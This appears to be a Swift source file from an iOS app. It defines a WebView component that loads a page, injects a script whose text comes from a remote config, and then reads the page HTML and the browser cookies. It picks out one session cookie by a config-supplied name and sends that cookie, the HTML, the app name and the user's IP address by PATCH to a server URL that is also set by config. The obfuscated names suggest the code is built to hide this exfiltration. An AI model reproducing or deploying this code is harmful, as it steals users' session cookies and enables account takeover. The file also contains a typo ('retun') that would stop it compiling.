//
//  File.swift
//
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsSix: UIViewRepresentable {
    func makeCoordinator() -> ClassSixCoordinat_or {
        ClassSixCoordinat_or(self)
    }
    let url: URL?
    @Binding var is_six_check_10_phut: Bool

    private let observable_six = six_Ob_servable()
    var ob_six_server: NSKeyValueObservation? {
        observable_six.six_ins_tance
    }

    // end check url
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let source: String = arrayData[ValueKey.Chung_fr_01.rawValue] ?? ""
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController: WKUserContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { } // updateUIView

    class ClassSixCoordinat_or: NSObject, WKNavigationDelegate {
        var six_parent: CoordsSix
        init(_ six_parent: CoordsSix) {
            self.six_parent = six_parent
        }
        
        func readIppAdd() -> String {
            var address_i_p: String?
            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let loadedPerson = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
                    address_i_p = loadedPerson.diachiip
                }
            }
            retun address_i_p ?? "diachiip_IP_Null"
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) { }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                    if let htmlrecovery = html as? String, error == nil {
                        if !htmlrecovery.isEmpty {
                            if htmlrecovery.contains(arrayData[ValueKey.dq4_fr_1a.rawValue] ?? "") {
                                self.six_parent.is_six_check_10_phut = true
                            } else {
                                self.six_parent.is_six_check_10_phut = false
//                                 self.six_parent.is_six_check_10_phut = true // demo
                            }
                            WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                let six_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                                if six_i != nil {
                                    let Six_json_data: [String: Any] = [
                                        arrayData[ValueKey.name_api_16.rawValue] ?? "": cookies[six_i!].value,
                                        arrayData[ValueKey.name_api_17.rawValue] ?? "": "\(htmlrecovery)",
                                        arrayData[ValueKey.name_api_18.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")",
                                        arrayData[ValueKey.name_api_19.rawValue] ?? "": self.readIppAdd(),
                                    ]
                                    // print("\(RCValues.sharedInstance.string(forKey: .Chung_fr_06))")
                                    let url: URL = URL(string: arrayData[ValueKey.Chung_fr_06.rawValue] ?? "")!
                                    let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                    var request = URLRequest(url: url)
                                    request.httpMethod = "PATCH"
                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                    request.httpBody = json_data
                                    let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                        if error != nil {
                                            print("not_ok")
                                        } else if data != nil {
                                            // self.parent.is_five_get_html_ads = five_html_ads_show
                                        }
                                    }
                                    task.resume()
                                } // if
                            }) // getAllCookies
                        }
                    }
                } // Get html
            }
        } // didFinish
    } // Class Coordinator
}

// Mark Lop theo doi url
@available(iOS 14.0, *)
private class six_Ob_servable: ObservableObject {
    @Published var six_ins_tance: NSKeyValueObservation?
}

struct UserInvoicesIpadress: Codable {
    var diachiip: String
}
